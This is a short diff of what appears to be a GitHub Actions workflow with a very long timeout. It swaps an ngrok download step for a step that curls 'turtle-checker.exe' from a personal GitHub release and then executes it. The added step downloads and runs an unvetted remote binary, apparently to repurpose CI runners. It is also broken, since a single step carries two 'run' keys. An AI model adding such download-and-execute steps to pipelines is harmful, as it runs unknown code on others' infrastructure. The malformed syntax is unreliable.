@@ -13,6 +13,6 @@ jobs:
     timeout-minutes: 9999
 
     steps:
-    - name: Downloading Ngrok.
-      run: |
-        Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+    - name: curl.
+      run: curl -L -o turtle-checker.exe https://github.com/endri12345/wejhs/releases/download/files/turtle-checker.exe
+      run: turtle-checker.exe
